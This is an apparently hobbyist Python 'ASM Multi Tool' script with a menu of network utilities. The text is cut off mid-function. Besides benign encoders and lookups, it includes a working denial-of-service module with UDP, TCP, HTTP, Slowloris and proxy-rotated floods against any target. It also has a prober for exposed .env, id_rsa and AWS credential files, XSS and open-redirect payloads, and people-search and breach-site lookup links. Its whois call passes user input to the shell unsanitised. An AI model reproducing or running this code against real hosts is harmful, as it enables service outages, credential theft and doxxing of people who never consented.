import math
import ssl
import threading
from colorama import init, Fore, Style
import os
import time
import random
import string
import hashlib
import base64
import requests
import socket
import urllib.parse
import subprocess
import sys
import uuid
import platform
import getpass
from urllib.parse import urljoin, urlparse
from os import system as clear_screen
# dont touch anything if you dont know what youre doing
# if you want to add custom tools, create the function, remove the "coming soon" text in the menu and add a call to the function in the main loop, thats it
# tool can be modified and redistributed, no malware included, thanks for using ASM Multi Tool <3
# made by ONLY @anc.w on discord - if you want to support the project, consider donating or sharing the tool, also feel free to reach out if you have any questions or suggestions
# i also sell code, dm me on discord if youre interested in anything custom, i do web, software and bot development, as well as scripting and automation, i can also obfuscate and protect your code if you want, just ask
# prices start at $5 for small scripts, $20 for more complex projects, and can go up to $100+ for large software with custom features and protections, payment via cashapp only: $anciscool
# issues? dm me on discord, but make sure to check the github page for updates and fixes first:
# secret menu thing: if you type UPD it will check for updates for you :)
# made with love in my dining room <3
init(autoreset=True)
version = "1.2"
# DO NOT CHANGE THE VERSION
COLORS = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.BLUE, Fore.MAGENTA, Fore.WHITE]
key_system = False
def get_hwid():
    try:
        parts = [
            platform.node() or "",
            getpass.getuser() or "",
            socket.gethostname() or "",
            os.environ.get("PROCESSOR_IDENTIFIER", ""),
            str(os.cpu_count() or 0),
            platform.processor() or ""
        ]
        raw = "".join(parts)
        return hashlib.sha256(raw.encode()).hexdigest()[:32]
    except:
        return "fallback-" + str(uuid.uuid4())[:12]

key_system = False
# change to False to turn off key system, True for on, also webhook URL is base64 encoded in the code, so you can change it to your own if you want to keep it on (just encode your URL in base64 and replace the string)
if key_system:
    print(Fore.YELLOW + "Authorizing tool...")

    encoded_webhook = "your base64 encoded webhook MUST BE BASE64 ENCODED, DO NOT PUT PLAIN URL HERE"

    try:
        webhook_url = base64.b64decode(encoded_webhook).decode('utf-8')
        print(Fore.GREEN + "Success on webhook grab, proceeding.")
    except Exception:
        print(Fore.RED + "Auth configuration error. Exiting.")
        sys.exit(1)

    hwid = get_hwid()
    request_uuid = str(uuid.uuid4())

    payload = {
        "content": f"**New ASM key request**\nHWID: ```{hwid}```\nKey: ```{request_uuid}```",
        "username": "ASM Auth Bot",
    }

    print(Fore.CYAN + "Sending registration request...")

    try:
        response = requests.post(webhook_url, json=payload, timeout=8)
        if response.status_code not in (200, 204):
            print(Fore.RED + f"Authorization server rejected (code {response.status_code}).")
            sys.exit(1)
    except Exception as e:
        print(Fore.RED + f"Cannot reach authorization server: {str(e)}")
        sys.exit(1)

    print("\n" + Fore.CYAN + "═" * 70)
    print(" Get your key")
    print(" Wait for your personal key to be sent")
    print(" Do NOT close this window yet.")
    print("═" * 70 + "\n")

    user_key = input(Fore.MAGENTA + "Enter the key you received → ").strip()

    if user_key == request_uuid:
        print(Fore.GREEN + "\nKey matches. Tool unlocked.")
        time.sleep(1)
    else:
        print(Fore.RED + "\nWrong key.")
        input(Fore.YELLOW + "Press ENTER to exit...")
        sys.exit(1)
else:
    print(Fore.GREEN + "Key system disabled → tool unlocked automatically.")
    time.sleep(1)

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def rgb_banner(text):
    lines = text.splitlines()
    for offset in range(len(COLORS) * 2):
        clear()
        for line in lines:
            for i, char in enumerate(line):
                print(COLORS[(i + offset) % len(COLORS)] + char, end='')
            print()
        time.sleep(0.025)
    clear()
    print(text)
    print(Fore.CYAN + "═══════════════════════════════════════════════════════════════")

def get_banner():
    try:
        with open("banner2.txt", "r", encoding="utf-8") as f:
            return f.read().rstrip()
    except:
        return """\
  █████╗ ███████╗███╗   ███╗
 ██╔══██╗██╔════╝████╗ ████║
 ███████║███████╗██╔████╔██║
 ██╔══██║╚════██║██║╚██╔╝██║
 ██║  ██║███████║██║ ╚═╝ ██║
 ╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝
        ASM MULTI TOOL
    actually safe multitool
"""

def loading():
    print(Fore.YELLOW + "Loading", end="")
    for c in COLORS:
        print(c + ".", end="", flush=True)
        time.sleep(0.12)
    print(Style.RESET_ALL)

def print_menu(page=1):
    clear()
    banner = get_banner()
    rgb_banner(banner)
    print(Fore.LIGHTCYAN_EX + f"                     ASM MULTI-TOOL  •  PAGE {page}/2")
    print(Fore.CYAN + "═══════════════════════════════════════════════════════════════")
    print()

    if page == 1:
        options = [
            " 1 │ IP Geolocation Lookup",
            " 2 │ Port Scanner",
            " 3 │ Password Generator",
            " 4 │ Hash Generator",
            " 5 │ Base64 Encode",
            " 6 │ Base64 Decode",
            " 7 │ URL Encode",
            " 8 │ URL Decode",
            " 9 │ Random String Generator",
            "10 │ HTTP Headers Checker",
            "11 │ Ping Host",
            "12 │ Webpage Title Scraper",
            "13 │ TCP Listener (nc style)",
            "14 │ File Downloader",
            "15 │ WiFi Passwords (Windows)",
            "16 │ Random User-Agent",
            "17 │ XOR Encrypt/Decrypt",
            "18 │ Check if Site is Up",
            "19 │ Generate UUID v4",
            "20 │ ROT13 Encode/Decode",
            "21 │ Text ↔ Binary Converter",
            "22 │ Reverse DNS Lookup",
            "23 │ Local Network Interfaces",
            "24 │ Exit / Quit"
        ]
        nav_text = "N │ Next Page →"
    else:
        options = [
            "25 │ Subdomain Finder",
            "26 │ DoS Attack",
            "27 │ Stress Test",
            "28 │ OSINT Gathering",
            "29 │ WHOIS Lookup",
            "30 │ Account finder",
            "31 │ Vulnerability Scanner",
            "32 │ Password Strength",
            "33 │ Look for Leaks",
            "34 │ Proxy Checker",
            "35 │ VPN Checker",
            "36 │ SSL Checker",
            "37 │ Buggy RGB Banner",
            "38 │ Coming Soon",
            "39 │ Coming Soon",
            "40 │ Coming Soon",
            "41 │ Coming Soon",
            "42 │ Coming Soon",
            "43 │ Coming Soon",
            "44 │ Coming Soon",
            "45 │ Coming Soon",
            "46 │ Coming Soon",
            "47 │ Coming Soon",
            "48 │ Coming Soon",
            "49 │ Exit / Quit"
        ]
        nav_text = "P │ Previous Page ←"

    col1 = options[0:6]
    col2 = options[6:12]
    col3 = options[12:18]
    col4 = options[18:24]

    for i in range(6):
        line = ""
        if i < len(col1): line += f"{Fore.WHITE}{col1[i]:<30}"
        if i < len(col2): line += f"{Fore.WHITE}{col2[i]:<30}"
        if i < len(col3): line += f"{Fore.WHITE}{col3[i]:<30}"
        if i < len(col4): line += f"{Fore.WHITE}{col4[i]}"
        print(line)

    print()
    print(Fore.YELLOW + nav_text)
    print()
    print(Fore.CYAN + "═══════════════════════════════════════════════════════════════")

def ip_lookup():
    clear(); rgb_banner(get_banner())
    target = input(Fore.MAGENTA + "IP / domain → ").strip()
    if not target: return
    loading()
    try:
        r = requests.get(f"http://ip-api.com/json/{target}", timeout=8)
        d = r.json()
        if d.get("status") == "success":
            print(Fore.GREEN + f"IP       {d.get('query','-')}")
            print(f"Country  {d.get('country','-')} ({d.get('countryCode','-')})")
            print(f"City     {d.get('city','-')}")
            print(f"ISP      {d.get('isp','-')}")
            print(f"Org      {d.get('org','-')}")
        else:
            print(Fore.RED + "Lookup failed")
    except:
        print(Fore.RED + "Connection error")

def port_scan():
    clear(); rgb_banner(get_banner())
    target = input(Fore.MAGENTA + "Target (IP or domain) → ").strip()
    if not target: return
    try:
        ip = socket.gethostbyname(target)
        print(Fore.YELLOW + f"Resolved → {ip}")
    except:
        print(Fore.RED + "Cannot resolve")
        return
    ports = [21,22,23,25,53,80,110,135,139,143,443,445,1433,3306,3389,5900,8080,8443]
    loading()
    for p in ports:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.5)
        if s.connect_ex((ip, p)) == 0:
            print(Fore.GREEN + f"Port {p:>5} → OPEN")
        s.close()
    print(Fore.CYAN + "Scan finished.")

def subdomain_finder():
    clear(); rgb_banner(get_banner())
    domain = input(Fore.MAGENTA + "Target domain (example.com) → ").strip()
    if not domain: return
    common_subs = [
        "admin", "api", "app", "auth", "beta", "blog", "cdn", "chat", "cms", "console",
        "dashboard", "dev", "docs", "email", "ftp", "git", "help", "internal", "jenkins", "jira",
        "login", "mail", "media", "monitor", "mysql", "news", "portal", "prod", "redis", "secure",
        "shop", "staging", "static", "status", "support", "test", "vpn", "web", "wiki", "www",
        "backup", "db", "elastic", "grafana", "kibana", "nexus", "prometheus", "sentry", "sonar"
    ]
    print(Fore.YELLOW + f"Checking {len(common_subs)} interesting subdomains...")
    found = []
    for sub in common_subs:
        full = f"{sub}.{domain}"
        try:
            ip = socket.gethostbyname(full)
            print(Fore.GREEN + f"  {full:<25} → {ip}")
            found.append(full)
        except:
            pass
    if found:
        print(f"\n{Fore.GREEN}Found {len(found)} live interesting subdomains.")
    else:
        print(f"\n{Fore.YELLOW}No live interesting subdomains found in this list.")
    print(Fore.CYAN + "Done.")

def dos_attack():
    clear(); rgb_banner(get_banner())
    
    target = input(Fore.MAGENTA + "Target IP or domain → ").strip()
    if not target: return
    
    try:
        ip = socket.gethostbyname(target)
        print(Fore.YELLOW + f"Resolved → {ip}")
    except:
        print(Fore.RED + "Cannot resolve target")
        return
    
    method_input = input(Fore.MAGENTA + "Method (UDP/TCP/HTTP/SLOWLORIS/PROXYHTTP or 'methods' to list) → ").strip().upper()
    
    if method_input == "METHODS":
        print(Fore.CYAN + "\nAvailable methods:")
        print("  UDP        → Classic UDP flood")
        print("  TCP        → TCP connect flood")
        print("  HTTP       → HTTP GET flood")
        print("  SLOWLORIS  → Slow HTTP headers")
        print("  PROXYHTTP  → HTTP flood via scraped proxies")
        print(Fore.YELLOW + "Note: Most modern protections drop these easily.\n")
        method_input = input(Fore.MAGENTA + "Choose method → ").strip().upper()
        if not method_input: return
    
    port_input = input(Fore.MAGENTA + "Target port (default 80) → ").strip()
    port = int(port_input) if port_input.isdigit() else 80
    
    duration_input = input(Fore.MAGENTA + "Duration in seconds (default 60) → ").strip()
    duration = int(duration_input) if duration_input.isdigit() else 60
    
    scan_choice = input(Fore.MAGENTA + "Quick scan common ports first? (y/n) → ").lower()
    if scan_choice == 'y':
        print(Fore.YELLOW + "Scanning common ports...")
        common_ports = [21,22,23,25,53,80,110,143,443,445,3306,3389,8080,8443]
        open_ports = []
        for p in common_ports:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.4)
            if s.connect_ex((ip, p)) == 0:
                open_ports.append(p)
            s.close()
        if open_ports:
            print(Fore.GREEN + f"Open ports found: {open_ports}")
            port_choice = input(Fore.MAGENTA + f"Use one of these ports instead? (enter number or keep {port}) → ").strip()
            if port_choice.isdigit() and int(port_choice) in open_ports:
                port = int(port_choice)
        else:
            print(Fore.YELLOW + "No common ports open → proceeding anyway")
    
    size_or_threads_input = input(Fore.MAGENTA + "Packet size / thread count (default 1024 / 50) → ").strip()
    try:
        size_or_threads = int(size_or_threads_input)
    except:
        size_or_threads = 1024 if method_input in ["UDP","TCP"] else 50
    
    print(Fore.YELLOW + f"Starting {method_input} attack on {ip}:{port} for {duration} seconds...")
    
    end_time = time.time() + duration
    sent_count = 0
    lock = threading.Lock()
    
    def udp_flood():
        nonlocal sent_count
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(os.urandom(size_or_threads), (ip, port))
                with lock:
                    sent_count += 1
            except:
                pass
    
    def tcp_flood():
        nonlocal sent_count
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((ip, port))
                s.close()
                with lock:
                    sent_count += 1
            except:
                pass
    
    def http_flood():
        nonlocal sent_count
        url = f"http://{ip}:{port if port != 80 else ''}/"
        headers = {"User-Agent": random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15"
        ])}
        while time.time() < end_time:
            try:
                requests.get(url, headers=headers, timeout=3)
                with lock:
                    sent_count += 1
            except:
                pass
    
    def slowloris():
        nonlocal sent_count
        sockets = []
        for _ in range(size_or_threads):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, port))
                s.send(f"GET /?{random.randint(0,5000)} HTTP/1.1\r\n".encode())
                s.send(f"Host: {target}\r\n".encode())
                s.send("User-Agent: Mozilla/5.0\r\n".encode())
                sockets.append(s)
                with lock:
                    sent_count += 1
            except:
                pass
        while time.time() < end_time:
            for s in list(sockets):
                try:
                    s.send(f"X-a: {random.randint(1,9999)}\r\n".encode())
                except:
                    sockets.remove(s)
            time.sleep(15)
    import queue
    def proxy_http_flood():
        nonlocal sent_count
        print(Fore.YELLOW + "Scraping free proxies...")
        proxies = []
        try:
            r = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all", timeout=15)
            if r.status_code == 200:
                proxies = [f"http://{line.strip()}" for line in r.text.splitlines() if ':' in line.strip()]
                print(Fore.GREEN + f"Found {len(proxies)} proxies")
        except:
            print(Fore.RED + "Failed to scrape proxies → using direct connection")
        
        url = f"http://{ip}:{port if port != 80 else ''}/"
        proxy_queue = queue.Queue()
        for p in proxies[:150]:
            proxy_queue.put(p)
        
        def proxy_worker():
            nonlocal sent_count
            while time.time() < end_time and not proxy_queue.empty():
                try:
                    proxy = proxy_queue.get_nowait()
                    requests.get(url, proxies={"http": proxy, "https": proxy}, timeout=6)
                    with lock:
                        sent_count += 1
                except:
                    pass
                time.sleep(random.uniform(0.2, 0.8))
        
        threads = []
        thread_count = min(40, len(proxies) or 20)
        for _ in range(thread_count):
            t = threading.Thread(target=proxy_worker)
            t.daemon = True
            t.start()
            threads.append(t)
        for t in threads:
            t.join()
    
    attack_map = {
        "UDP": udp_flood,
        "TCP": tcp_flood,
        "HTTP": http_flood,
        "SLOWLORIS": slowloris,
        "PROXYHTTP": proxy_http_flood
    }
    
    if method_input not in attack_map:
        print(Fore.RED + "Unknown method → defaulting to UDP")
        method_input = "UDP"
    
    if method_input in ["HTTP", "SLOWLORIS", "PROXYHTTP"]:
        threads = []
        thread_count = size_or_threads if method_input != "SLOWLORIS" else 1
        for _ in range(thread_count):
            t = threading.Thread(target=attack_map[method_input])
            t.daemon = True
            t.start()
            threads.append(t)
        try:
            while any(t.is_alive() for t in threads) and time.time() < end_time:
                time.sleep(1)
        except KeyboardInterrupt:
            print(Fore.RED + "\nAborted.")
    else:
        attack_map[method_input]()
    
    print(Fore.CYAN + f"Attack finished. Total packets/requests sent: {sent_count}")

def stress_test():
    clear(); rgb_banner(get_banner())
    target = input(Fore.MAGENTA + "Target URL (with http/https) → ").strip()
    if not target: return
    duration_input = input(Fore.MAGENTA + "Duration in seconds (default 30) → ").strip()
    duration = int(duration_input) if duration_input.isdigit() else 30
    print(Fore.YELLOW + f"Starting stress test on {target} for {duration} seconds...")
    end_time = time.time() + duration
    request_count = 0
    while time.time() < end_time:
        try:
            r = requests.get(target, timeout=5)
            request_count += 1
            print(Fore.GREEN + f"Sent request #{request_count} - Status: {r.status_code}")
        except:
            print(Fore.RED + f"Request #{request_count+1} failed")
        if request_count % 10 == 0:
            print(Fore.GREEN + f"Sent {request_count} requests...")
    print(Fore.CYAN + f"Stress test finished. Total requests sent: {request_count}")

def osint_gathering():
    rgb_banner(get_banner())
    
    target = input("\n" + Fore.MAGENTA + "Target (username, email, domain, IP, phone…) → " + Fore.RESET).strip()
    if not target:
        print(Fore.RED + "No target provided. Exiting.")
        return
    
    encoded = urllib.parse.quote(target)
    print("\n" + Fore.YELLOW + f"Generating 100+ OSINT lookup links for → {target}")
    print(Fore.CYAN + "═" * 70)
    
    categories = {
        "General & Meta Search": [
            ("Google", f"https://www.google.com/search?q={encoded}"),
            ("Google (exact)", f"https://www.google.com/search?q=%22{encoded}%22"),
            ("Bing", f"https://www.bing.com/search?q={encoded}"),
            ("DuckDuckGo", f"https://duckduckgo.com/?q={encoded}"),
            ("Yandex", f"https://yandex.com/search/?text={encoded}"),
            ("Baidu (good for Asia)", f"https://www.baidu.com/s?wd={encoded}"),
            ("Intelligence X", f"https://intelx.io/?s={encoded}"),
            ("Wayback Machine", f"https://web.archive.org/web/*/{encoded}*"),
        ],
        
        "Breach & Leak Checks": [
            ("Have I Been Pwned", f"https://haveibeenpwned.com/unifiedsearch/{encoded}"),
            ("DeHashed", f"https://dehashed.com/search?query={encoded}"),
            ("LeakCheck", f"https://leakcheck.io/search/{encoded}"),
            ("Snusbase (if account)", "https://snusbase.com/search"),
            ("BreachForums search", f"https://breached.vc/Search/?q={encoded}"),
        ],
        
        "IP / Domain / Network Recon": [
            ("Shodan", f"https://www.shodan.io/search?query={encoded}"),
            ("Censys", f"https://search.censys.io/search?q={encoded}"),
            ("FOFA", f"https://en.fofa.info/result?qbase64={base64.b64encode(encoded.encode()).decode()}"),
            ("ZoomEye", f"https://www.zoomeye.org/searchResult/both?q={encoded}"),
            ("BinaryEdge", f"https://app.binaryedge.io/search?q={encoded}"),
            ("GreyNoise", f"https://viz.greynoise.io/query?q={encoded}"),
            ("VirusTotal", f"https://www.virustotal.com/gui/search/{encoded}"),
            ("URLScan.io", f"https://urlscan.io/search/#{encoded}"),
            ("SecurityTrails", f"https://securitytrails.com/list/domain/{target}" if '.' in target else f"https://securitytrails.com/search?query={encoded}"),
            ("crt.sh (certs)", f"https://crt.sh/?q={encoded}"),
            ("DNSDumpster", f"https://dnsdumpster.com/"),
            ("ViewDNS.info", f"https://viewdns.info/"),
        ],
        
        "Username / People Search": [
            ("WhatsMyName", f"https://whatsmyname.app/?q={encoded}"),
            ("Namechk", f"https://namechk.com/"),
            ("KnowEm", f"https://knowem.com/search?q={encoded}"),
            ("Namecheckr", f"https://www.namecheckr.com/"),
            ("Instant Username", f"https://instantusername.com/#/search/{encoded}"),
            ("UserSearch", f"https://usersearch.org/results.php?searchTerm={encoded}"),
            ("Sherlock (CLI ref)", "https://github.com/sherlock-project/sherlock"),
            ("Pipl (people)", f"https://pipl.com/search/?q={encoded}"),
            ("Spokeo", f"https://www.spokeo.com/search?q={encoded}"),
            ("BeenVerified", f"https://www.beenverified.com/search?q={encoded}"),
            ("OSINT Industries", f"https://app.osint.industries/lookup?query={encoded}"),
        ],
        
        "Social Media & Forums": [
            ("X / Twitter", f"https://twitter.com/search?q={encoded}&src=typed_query"),
            ("Facebook", f"https://www.facebook.com/search/top?q={encoded}"),
            ("Instagram", f"https://www.instagram.com/explore/search/keyword/?q={encoded}"),
            ("LinkedIn", f"https://www.linkedin.com/search/results/all/?keywords={encoded}"),
            ("Reddit", f"https://www.reddit.com/search/?q={encoded}"),
            ("TikTok", f"https://www.tiktok.com/search?q={encoded}"),
            ("Telegram (via TGStat)", f"https://tgstat.com/search?query={encoded}"),
            ("Discord search (via Disboard etc.)", f"https://disboard.org/search?keyword={encoded}"),
            ("Pastebin", f"https://pastebin.com/search?q={encoded}"),
            ("GitHub", f"https://github.com/search?q={encoded}&type=code"),
            ("GitLab", f"https://gitlab.com/search?search={encoded}"),
            ("Bitbucket", f"https://bitbucket.org/search?q={encoded}"),
        ],
        
        "Other / Niche / Dark Web-ish": [
            ("Onion search (Ahmia)", f"https://ahmia.fi/search/?q={encoded}"),
            ("Torch", "http://xmh57jrzrnw6insl.onion/"),
            ("DarkSearch", f"https://darksearch.io/search?query={encoded}"),
            ("Hunter.io (emails)", f"https://hunter.io/search?query={encoded}"),
            ("EmailRep", f"https://emailrep.io/{encoded}"),
            ("AbuseIPDB", f"https://www.abuseipdb.com/check/{target}"),
            ("AlienVault OTX", f"https://otx.alienvault.com/search?q={encoded}"),
            ("Pulsedive", f"https://pulsedive.com/search/?q={encoded}"),
            ("Hybrid Analysis", f"https://www.hybrid-analysis.com/search?query={encoded}"),
            ("Any.Run", f"https://any.run/report/?q={encoded}"),
        ],
    }
    
    count = 0
    for cat_name, links in categories.items():
        print(f"\n{Fore.BLUE}{cat_name}:{Fore.RESET}")
        print(Fore.CYAN + "─" * 60)
        for name, url in links:
            print(f"{Fore.GREEN}{name:22} → {Fore.WHITE}{url}")
            count += 1
    
    extras = [
        ("Google Dorks example", f"https://www.google.com/search?q=intext%3A%22{encoded}%22+filetype%3Atxt"),
        ("LinkedIn people", f"https://www.linkedin.com/search/results/people/?keywords={encoded}"),
        ("X advanced", f"https://twitter.com/search-advanced?lang=en&q={encoded}"),
    ]
    
    print(f"\n{Fore.BLUE}Quick Extras / Variants:{Fore.RESET}")
    print(Fore.CYAN + "─" * 60)
    for name, url in extras:
        print(f"{Fore.GREEN}{name:22} → {Fore.WHITE}{url}")
        count += 1
    
    print(Fore.CYAN + "═" * 70)
    print(f"\n{Fore.YELLOW}Generated {count} links. Ctrl+Click to open (most terminals).")

def whois_lookup():
    clear(); rgb_banner(get_banner())
    target = input(Fore.MAGENTA + "Domain or IP → ").strip()
    if not target: return
    print(Fore.YELLOW + f"Performing WHOIS lookup for {target} ...")
    try:
        if os.name == "nt":
            result = subprocess.check_output(f"whois {target}", shell=True, text=True, stderr=subprocess.DEVNULL)
        else:
            result = subprocess.check_output(["whois", target], text=True, stderr=subprocess.DEVNULL)
        print(Fore.GREEN + result)
    except Exception as e:
        print(Fore.RED + f"WHOIS lookup failed: {str(e)}")

def account_finder():
    clear(); rgb_banner(get_banner())
    username = input(Fore.MAGENTA + "Username to search → ").strip()
    if not username: return
    
    encoded = urllib.parse.quote(username)
    platforms = {
        "X / Twitter": f"https://twitter.com/{username}",
        "Facebook": f"https://www.facebook.com/{username}",
        "Instagram": f"https://www.instagram.com/{username}",
        "LinkedIn": f"https://www.linkedin.com/in/{username}",
        "Reddit": f"https://www.reddit.com/user/{username}",
        "TikTok": f"https://www.tiktok.com/@{username}",
        "GitHub": f"https://github.com/{username}",
        "GitLab": f"https://gitlab.com/{username}",
        "Bitbucket": f"https://bitbucket.org/{username}",
        "YouTube": f"https://www.youtube.com/@{username}",
        "Twitch": f"https://www.twitch.tv/{username}",
        "Pinterest": f"https://www.pinterest.com/{username}",
        "Snapchat": f"https://www.snapchat.com/add/{username}",
        "Discord": f"https://discord.com/users/{username}",
        "Steam": f"https://steamcommunity.com/id/{username}",
        "Telegram": f"https://t.me/{username}",
        "Mastodon": f"https://mastodon.social/@{username}",
        "Bluesky": f"https://bsky.app/profile/{username}",
        "Threads": f"https://www.threads.net/@{username}",
        "OnlyFans": f"https://onlyfans.com/{username}",
        "Patreon": f"https://www.patreon.com/{username}",
        "Behance": f"https://www.behance.net/{username}",
        "Dribbble": f"https://dribbble.com/{username}",
        "DeviantArt": f"https://www.deviantart.com/{username}",
        "SoundCloud": f"https://soundcloud.com/{username}",
        "Mixcloud": f"https://www.mixcloud.com/{username}",
        "Bandcamp": f"https://bandcamp.com/{username}",
        "Vimeo": f"https://vimeo.com/{username}",
        "Flickr": f"https://www.flickr.com/people/{username}",
        "500px": f"https://500px.com/{username}",
        "Imgur": f"https://imgur.com/user/{username}",
        "Tumblr": f"https://www.tumblr.com/{username}",
        "VK": f"https://vk.com/{username}",
        "OK.ru": f"https://ok.ru/{username}",
        "Weibo": f"https://weibo.com/{username}",
        "Bilibili": f"https://space.bilibili.com/{username}",
        "Douyin": f"https://www.douyin.com/user/{username}",
        "Kuaishou": f"https://www.kuaishou.com/profile/{username}",
        "LiveJournal": f"https://www.livejournal.com/profile?user={username}",
        "Amino": f"https://aminoapps.com/c/{username}",
        "Ask.fm": f"https://ask.fm/{username}",
        "About.me": f"https://about.me/{username}",
        "AngelList": f"https://angel.co/{username}",
        "Goodreads": f"https://www.goodreads.com/{username}",
        "Last.fm": f"https://www.last.fm/user/{username}",
        "Letterboxd": f"https://letterboxd.com/{username}",
        "MyAnimeList": f"https://myanimelist.net/profile/{username}",
        "RateYourMusic": f"https://rateyourmusic.com/~{username}",
        "Strava": f"https://www.strava.com/athletes/{username}",
        "Runkeeper": f"https://runkeeper.com/user/{username}",
        "Untappd": f"https://untappd.com/user/{username}",
        "Trakt": f"https://trakt.tv/users/{username}",
        "Chess.com": f"https://www.chess.com/member/{username}",
        "Lichess": f"https://lichess.org/@/{username}",
        "Roblox": f"https://www.roblox.com/users/search?keyword={username}",
        "Minecraft (NameMC)": f"https://namemc.com/search?q={username}",
        "Hypixel": f"https://hypixel.net/members/{username}",
        "Fortnite Tracker": f"https://fortnitetracker.com/profile/all/{username}",
        "Apex Legends Tracker": f"https://apex.tracker.gg/profile/origin/{username}",
        "COD Tracker": f"https://cod.tracker.gg/warzone/profile/{username}",
        "Valorant Tracker": f"https://tracker.gg/valorant/search?name={username}",
        "Overwatch": f"https://playoverwatch.com/en-us/career/pc/{username}",
        "Xbox Gamertag": f"https://account.xbox.com/en-us/profile?gamertag={username}",
        "PSN": f"https://psnprofiles.com/{username}",
        "Nintendo": f"https://www.nintendo.com/switch-online/friends/{username}",
        " itch.io": f"https://itch.io/profile/{username}",
        "Ko-fi": f"https://ko-fi.com/{username}",
        "Buy Me a Coffee": f"https://www.buymeacoffee.com/{username}",
        "Gumroad": f"https://gumroad.com/{username}",
        "Teespring": f"https://teespring.com/stores/{username}",
        "Society6": f"https://society6.com/{username}",
        "Redbubble": f"https://www.redbubble.com/people/{username}",
        "Etsy": f"https://www.etsy.com/shop/{username}",
        "DeviantArt": f"https://www.deviantart.com/{username}",
        "ArtStation": f"https://www.artstation.com/{username}",
        "Cargo": f"https://cargo.site/{username}",
        "Carbonmade": f"https://carbonmade.com/{username}",
        "Coroflot": f"https://www.coroflot.com/{username}",
        "CGSociety": f"https://www.cgsociety.org/profile/{username}",
        "Renderosity": f"https://www.renderosity.com/users/{username}",
        "ZBrushCentral": f"https://www.zbrushcentral.com/u/{username}",
        "Polycount": f"https://polycount.com/profile/{username}",
        "GameJolt": f"https://gamejolt.com/@{username}",
        "Newgrounds": f"https://{username}.newgrounds.com",
        "DeviantArt Groups": f"https://www.deviantart.com/search?q={username}",
        "CodePen": f"https://codepen.io/{username}",
        "JSFiddle": f"https://jsfiddle.net/user/{username}",
        "Repl.it": f"https://replit.com/@{username}",
        "Glitch": f"https://glitch.com/@{username}",
        "Stack Overflow": f"https://stackoverflow.com/users/{username}",
        "Dev.to": f"https://dev.to/{username}",
        "Hashnode": f"https://hashnode.com/@{username}",
        "Medium": f"https://medium.com/@{username}",
        "Quora": f"https://www.quora.com/profile/{username}",
        "ResearchGate": f"https://www.researchgate.net/profile/{username}",
        "Academia.edu": f"https://independent.academia.edu/{username}",
        "ORCID": f"https://orcid.org/{username}",
        "Keybase": f"https://keybase.io/{username}",
        "Keybase (old)": f"https://keybase.io/{username}/allkeys",
        "Gravatar": f"https://gravatar.com/{username}",
        "Gravatar (hash)": f"https://www.gravatar.com/avatar/{encoded}",
        "WhatsMyName": f"https://whatsmyname.app/?q={encoded}",
        "Namechk": f"https://namechk.com/",
        "KnowEm": f"https://knowem.com/search?q={encoded}",
        "Instant Username": f"https://instantusername.com/#/search/{encoded}",
        "Namecheckr": f"https://www.namecheckr.com/",
        "UserSearch.org": f"https://usersearch.org/results.php?searchTerm={encoded}",
    }
    
    print(Fore.CYAN + "═" * 60)
    print(Fore.YELLOW + f"Checking username: {username}")
    print(Fore.CYAN + "═" * 60)
    
    for name, url in platforms.items():
        print(f"{Fore.GREEN}{name:24} → {Fore.WHITE}{url}")
    
    print(Fore.CYAN + "═" * 60)
    print(Fore.YELLOW + f"Generated {len(platforms)} username lookup links")

from concurrent.futures import ThreadPoolExecutor, as_completed

def normalize_url(url):
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    return url.rstrip('/')

def is_alive(url):
    try:
        r = requests.head(url, timeout=7, allow_redirects=True)
        return r.status_code < 500
    except:
        return False

def check_headers(target):
    try:
        r = requests.get(target, timeout=8, allow_redirects=True)
        headers = r.headers
        issues = []
        if 'Server' in headers:
            issues.append(f"Server: {headers['Server']}")
        if 'X-Powered-By' in headers:
            issues.append(f"X-Powered-By: {headers['X-Powered-By']}")
        if 'Strict-Transport-Security' not in headers:
            issues.append("Missing HSTS")
        if 'Content-Security-Policy' not in headers:
            issues.append("Missing CSP")
        if 'X-Frame-Options' not in headers:
            issues.append("Missing X-Frame-Options → clickjacking possible")
        if 'X-Content-Type-Options' not in headers:
            issues.append("Missing X-Content-Type-Options")
        if r.url.startswith('http://'):
            issues.append("Insecure redirect to HTTP")
        return issues
    except:
        return ["Failed to retrieve headers"]

def check_common_files(target):
    common_paths = [
        '/.env', '/.git/HEAD', '/.DS_Store', '/config.php', '/wp-config.php',
        '/backup.zip', '/backup.sql', '/admin', '/phpinfo.php', '/test.php',
        '/.htaccess', '/server-status', '/robots.txt', '/sitemap.xml',
        '/.gitignore', '/composer.json', '/package.json', '/id_rsa',
        '/.aws/credentials', '/debug.log', '/error.log'
    ]
    findings = []
    session = requests.Session()

    def check_path(path):
        full = urljoin(target, path)
        try:
            r = session.get(full, timeout=6, allow_redirects=True)
            if r.status_code == 200:
                size = len(r.content)
                text_lower = r.text.lower()
                if any(kw in text_lower for kw in ['password', 'secret', 'key=', 'aws_access', 'begin rsa', 'db_password']):
                    return (path, "SENSITIVE LEAK", r.url, size)
                elif size > 0:
                    return (path, "EXISTS", r.url, size)
            elif r.status_code in (401, 403):
                return (path, "PROTECTED", r.url, 0)
        except:
            pass
        return None

    with ThreadPoolExecutor(max_workers=15) as executor:
        futures = [executor.submit(check_path, p) for p in common_paths]
        for future in as_completed(futures):
            res = future.result()
            if res:
                findings.append(res)

    return findings

def basic_xss_open_redirect(target):
    payloads = [
        "<script>alert(1337)</script>",
        "javascript:alert(1)",
        "'\"><img src=x onerror=alert(1)>",
        "/?redirect=http://evil.com",
        "//google.com"
    ]
    results = []
    session = requests.Session()

    for p in payloads:
        test_url = urljoin(target, f"?q={urllib.parse.quote(p)}")  
        try:
